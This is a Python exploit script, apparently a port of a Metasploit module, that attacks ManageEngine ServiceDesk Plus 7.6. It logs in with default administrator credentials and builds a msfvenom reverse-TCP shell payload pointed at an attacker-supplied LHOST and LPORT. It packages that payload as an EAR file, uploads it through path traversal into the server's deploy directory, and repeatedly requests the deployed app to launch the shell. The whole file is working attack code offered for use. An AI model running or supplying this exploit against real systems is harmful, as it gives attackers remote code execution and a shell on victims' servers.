"""
ManageEngine ServiceDesk Plus 7.6 Exploit
A port of the Metasploit exploit module
https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/manageengine_auth_upload.rb
"""
import os, random, requests, string, subprocess, zipfile
from collections import OrderedDict
from getpass import *
from requests.packages.urllib3.fields import RequestField
from requests.packages.urllib3.filepost import encode_multipart_formdata
from time import sleep

#
r_string = lambda n: ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(n))
sess = requests.Session()

def main():
	print("ManageEngine ServiceDesk Plus 7.6 Exploit")
	
	target = "http://{}:8080/".format(raw_input("Target IP [e.g. 192.168.x.x]: "))
	print("[*] Authenticating to {}".format(target))
	sess.get(target)
	data = {'j_username':'administrator',
			'j_password':'administrator',
			'logonDomainName':-1}
	login = sess.post('{}{}'.format(target,'j_security_check'), data=data)
	if not login.ok:
		print("[!] Authentication failed")
		exit(-1)
	print("[+] Authentication successful")
	print("[*] Sending bogus file")
	bogus = send_multipart(target)
	
	if bogus.ok:
		filename = r"{}{}".format(r_string(8),".war")
		if create_payload(filename) == 0:
			if not os.path.exists(r'META-INF'):
				os.makedirs(r'META-INF')
			with open(r'META-INF/application.xml', 'wb') as app_xml:
				ear_app = r_string(32)
				app_xml.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>")
				app_xml.write("\n<application>")
				app_xml.write("\n<display-name>" + r_string(32) + "</display-name>")
				app_xml.write("\n<module><web><web-uri>" + filename + "</web-uri>")
				app_xml.write("\n<context-root>/" + ear_app + "</context-root></web></module></application>")
			app_xml.close()
			ear_file_name = r"{}{}".format(r_string(8),".ear")
			with zipfile.ZipFile(ear_file_name, mode = 'w') as ear_file:
				print("[*] Creating {} file".format(ear_file_name))
				ear_file.write(r'META-INF/application.xml')
				ear_file.write(filename)
			ear_file.close()
			exploit = send_multipart(target, ear_file_name)
			if exploit.ok:
				print("[+] Upload appears to have been successful")
				print("[*] Attempting to launch payload in deployed WAR...")
				for i in range(1, 10):
					sleep(2)
					trigger = sess.get('{}{}/{}/{}'.format(target, ear_app, filename.split('.')[0], r_string(16)))
					if trigger.ok:
						print("[+] Trigger successful")
						break
					else:
						print("[!] Trigger failed")
			else:
				print("[!] EAR upload failed")
		else:
			print("[!] Payload creation failed")
	else:
		print("[!] Bogus file upload failed")

def create_payload(filename):
	print("[*] Creating msfvenom payload [java/shell/reverse_tcp, format: war]")
	lhost = raw_input("\tLHOST=")
	lport = raw_input("\tLPORT=")
	#~ return subprocess.call(["msfvenom", "-p", "java/shell_reverse_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-f", "war", "-b", r"\x00\x0a", "-o", filename])
	return subprocess.call(["msfvenom", "-p", "java/shell/reverse_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-f", "war", "-b", r"\x00\0a", "-o", filename])

def send_multipart(target, path=None):
	rand1 = r_string(4)
	#~ f = {}
	f = OrderedDict()
	if path:
		f['module'] = (None, '../../server/default/deploy', None)
		f['{}'.format(rand1)] = (path, open(path, 'rb'), 'application/octet-stream', {'Content-Transfer-Encoding':'binary'})
		f['att_desc'] = (None, '', None)
	else:
		f['module'] = (None, r_string(4), None)
		f['{}'.format(rand1)] = (r_string(30), r_string(6), 'application/octet-stream', {'Content-Transfer-Encoding':'binary'})
		f['att_desc'] = (None, '', None)
	#~ print(f)
	r = requests.Request('POST', '{}common/FileAttachment.jsp'.format(target), files=f)
	prep = sess.prepare_request(r)
	return sess.send(prep)
	
if __name__ == "__main__":
	exit(main())
